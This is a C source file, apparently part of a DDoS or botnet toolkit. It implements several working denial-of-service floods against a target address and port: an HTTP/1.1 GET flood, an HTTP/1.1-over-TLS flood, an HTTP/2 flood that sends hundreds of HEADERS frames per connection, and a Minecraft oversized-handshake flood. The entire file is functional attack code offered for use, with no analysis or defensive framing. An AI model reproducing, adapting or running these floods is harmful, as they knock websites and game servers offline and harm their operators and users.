#define _GNU_SOURCE

#include "headers/attacks.h"
#include "headers/tls.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static int http_conn(struct sockaddr_in *d) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int one = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    int r = connect(s, (struct sockaddr *)d, sizeof(*d));
    if (r < 0 && errno == EINPROGRESS) {
        struct pollfd p = {s, POLLOUT, 0};
        if (poll(&p, 1, 5000) <= 0) { close(s); return -1; }
        int e = 0;
        socklen_t el = sizeof(e);
        getsockopt(s, SOL_SOCKET, SO_ERROR, &e, &el);
        if (e != 0) { close(s); return -1; }
    } else if (r < 0) {
        close(s);
        return -1;
    }
    fcntl(s, F_SETFL, fl);
    return s;
}

/* HTTP: plaintext HTTP/1.1 GET flood with custom path */
void *http_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);
    const char *host = (a->host[0] != '\0') ? a->host : a->ip;
    const char *path = (a->path[0] != '\0') ? a->path : "/";
    char req[1024];
    int rlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
        path, host);

    while (*a->active && time(NULL) < end) {
        int s = http_conn(&d);
        if (s < 0) { sleep(1); continue; }
        unsigned char drain[4096];
        for (int i = 0; i < 500 && *a->active && time(NULL) < end; i++) {
            if (send(s, req, (size_t)rlen, MSG_NOSIGNAL | MSG_DONTWAIT) < 0) break;
            if ((i & 15) == 15) recv(s, drain, sizeof(drain), MSG_DONTWAIT);
        }
        close(s);
    }
    return NULL;
}

/* HTTPS-CLASSIC: HTTP/1.1 over TLS (http/1.1 ALPN) */
void *https_classic_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);
    const char *host = (a->host[0] != '\0') ? a->host : a->ip;
    const char *path = (a->path[0] != '\0') ? a->path : "/";
    char req[1024];
    int rlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
        path, host);

    while (*a->active && time(NULL) < end) {
        int s = http_conn(&d);
        if (s < 0) { sleep(1); continue; }
        TLSContext *tls = tls_connect(s, host, 1);
        if (!tls) { close(s); continue; }
        unsigned char drain[4096];
        for (int i = 0; i < 500 && *a->active && time(NULL) < end; i++) {
            if (tls_write(tls, (const unsigned char *)req, rlen) < 0) break;
            if ((i & 15) == 15) tls_read_nonblock(tls, drain, sizeof(drain));
        }
        tls_close(tls);
        close(s);
    }
    return NULL;
}

/* HTTPS: HTTP/2 GET flood over our tls.c (ALPN h2) */
void *https_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;

    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);

    unsigned char hdr[4096];
    const char *sni = (a->host[0] != '\0') ? a->host : a->ip;
    const char *hpath = (a->path[0] != '\0') ? a->path : "/";
    int hlen = tls_h2_hpack_encode_get(hdr, sizeof(hdr), hpath, sni);
    if (hlen <= 0) return NULL;
    uint8_t frame[9 + 4096];
    tls_h2_frame_hdr(frame, hlen, 0x1, 0x5, 0); /* filled per-stream below */
    memcpy(frame + 9, hdr, (size_t)hlen);
    int framelen = 9 + hlen;

    static const char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    uint8_t settings[9];
    tls_h2_frame_hdr(settings, 0, 0x4, 0x0, 0);

    while (*a->active && time(NULL) < end) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) { sleep(1); continue; }
        int fl = fcntl(s, F_GETFL, 0);
        fcntl(s, F_SETFL, fl | O_NONBLOCK);
        int r = connect(s, (struct sockaddr *)&d, sizeof(d));
        if (r < 0 && errno == EINPROGRESS) {
            struct pollfd p = {s, POLLOUT, 0};
            if (poll(&p, 1, 5000) <= 0) { close(s); continue; }
            int e = 0;
            socklen_t el = sizeof(e);
            getsockopt(s, SOL_SOCKET, SO_ERROR, &e, &el);
            if (e != 0) { close(s); continue; }
        } else if (r < 0) {
            close(s);
            continue;
        }
        /* blocking for TLS */
        fcntl(s, F_SETFL, fl);
        TLSContext *tls = tls_connect(s, sni, 2);
        if (!tls) { close(s); continue; }
        if (tls_write(tls, (const unsigned char *)preface, 24) < 0) {
            tls_close(tls); close(s); continue;
        }
        if (tls_write(tls, settings, 9) < 0) {
            tls_close(tls); close(s); continue;
        }
        uint32_t sid = 1;
        unsigned char drain[4096];
        for (int i = 0; i < 500 && *a->active && time(NULL) < end; i++, sid += 2) {
            frame[5] = (sid >> 24) & 0x7f;
            frame[6] = (sid >> 16) & 0xff;
            frame[7] = (sid >> 8) & 0xff;
            frame[8] = sid & 0xff;
            if (tls_write(tls, frame, framelen) < 0) break;
            if ((i & 15) == 15) tls_read_nonblock(tls, drain, sizeof(drain));
        }
        tls_close(tls);
        close(s);
    }
    return NULL;
}

static int mc_varint(uint8_t *buf, uint32_t val) {
    int n = 0;
    do {
        uint8_t b = (uint8_t)(val & 0x7f);
        val >>= 7;
        if (val) b |= 0x80;
        buf[n++] = b;
    } while (val && n < 5);
    return n;
}

/* MINECRAFT bigpacket (forced): oversized handshake, proto 764 */
void *minecraft_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)a->port);
    inet_pton(AF_INET, a->ip, &d.sin_addr);

    int ps = 1024;
    uint8_t *big = malloc((size_t)ps + 128);
    int big_len = 0;
    if (big) {
        int pos = 0;
        pos += mc_varint(big + pos, 0);
        pos += mc_varint(big + pos, 0x2F2);
        pos += mc_varint(big + pos, (uint32_t)ps);
        memset(big + pos, 0x41, (size_t)ps);
        pos += ps;
        big[pos++] = 0x99;
        big[pos++] = 0xDD;
        pos += mc_varint(big + pos, 1);
        big_len = pos;
    }

    while (*a->active && time(NULL) < end) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) { sleep(1); continue; }
        int fl = fcntl(s, F_GETFL, 0);
        fcntl(s, F_SETFL, fl | O_NONBLOCK);
        int r = connect(s, (struct sockaddr *)&d, sizeof(d));
        if (r < 0 && errno == EINPROGRESS) {
            struct pollfd p = {s, POLLOUT, 0};
            if (poll(&p, 1, 3000) <= 0) { close(s); continue; }
            int e = 0;
            socklen_t el = sizeof(e);
            getsockopt(s, SOL_SOCKET, SO_ERROR, &e, &el);
            if (e != 0) { close(s); continue; }
        } else if (r < 0) {
            close(s);
            continue;
        }
        if (big && big_len > 0) {
            size_t sent = 0;
            while (sent < (size_t)big_len) {
                ssize_t n = send(s, big + sent, (size_t)big_len - sent, MSG_NOSIGNAL | MSG_DONTWAIT);
                if (n <= 0) break;
                sent += (size_t)n;
            }
            struct pollfd p = {s, POLLIN, 0};
            uint8_t drain[512];
            poll(&p, 1, 300);
            recv(s, drain, sizeof(drain), MSG_DONTWAIT);
        }
        close(s);
    }
    free(big);
    return NULL;
}
